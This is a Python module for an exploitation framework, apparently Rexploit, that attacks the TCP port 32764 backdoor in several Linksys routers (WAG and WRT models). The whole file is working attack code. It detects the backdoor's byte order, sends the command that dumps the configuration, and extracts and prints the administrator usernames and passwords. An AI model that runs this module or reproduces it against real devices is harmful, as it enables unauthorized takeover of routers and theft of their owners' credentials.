from lib.interfaces.iexploit import IExploit
import socket
import struct
import re


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="Backdoor TCP 32764",
            category="backdoor",
            authors={
                "Vulnerability discovery": "Eloi Vanderbeken",  # Proof of concept exploit
                "Rexploit module": "Daniel Diez"
            },
            date="17/02/2014",
            cwe="489",
            targets=[
                "Linksys WAG120N, WAG160N, WAG200N, WAG320N, WAG54G2, WRT350N, WRT300N"
            ],
            references={
                "https://github.com/elvanderb/TCP-32764": "GitHub"
            },
            description="Exploits backdoor functionality that allows execute some commands.\n"
                        "credentials (get http administrator credentials)"
        )
        self.__endianness = ""

    def default(self):
        cmd = {"cmd": "credentials"}

        return cmd

    def run(self, cmd):
        message = ""
        cmd = cmd["cmd"]
        if cmd == "credentials":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.getIP(), 32764))
            conf = self.sendMessage(s, 1)[1]
            lines = re.split("\x00|\x01", conf)
            pattern = re.compile('user(name)?|password|login')
            credentials = []
            for line in lines:
                try:
                    (var, value) = line.split("=")
                    if len(value) > 0 and pattern.search(var):
                        credentials += [[var, value]]
                except ValueError:
                    pass

            credentials.sort()
            for var, value in credentials:
                message += ("{}:{}\n".format(var, value))

        return message

    def check(self):
        # Big endian or little endian ?
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect((self.getIP(), 32764))
        except socket.error as v:
            return False

        s.send("blablablabla")
        response = s.recv(0xC)
        while len(response) < 0xC:
            tmp = s.recv(0xC - len(response))
            assert len(tmp) != 0
            response += tmp

        sig, ret_val, ret_len = struct.unpack('<III', response)
        if sig == 0x53634D4D:
            self.__endianness = "<"
        elif sig == 0x4D4D6353:
            self.__endianness = ">"
        else:
            s.close()
            return False, None

        s.close()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((self.getIP(), 32764))
        s.close()
        return True

    def sendMessage(self, sock, message, payload=''):
        header = struct.pack(self.__endianness + 'III', 0x53634D4D, message, len(payload) + 1)
        sock.send(header + payload + "\x00")
        response = sock.recv(0xC)

        while len(response) < 0xC:
            tmp = sock.recv(0xC - len(response))
            assert len(tmp) != 0
            response += tmp

        sig, value, length = struct.unpack(self.__endianness + 'III', response)
        assert (sig == 0x53634D4D)

        if value != 0:
            return value, "ERROR"

        string = ""
        while len(string) < length:
            tmp = sock.recv(length - len(string))
            assert len(tmp) != 0
            string += tmp

        return value, string

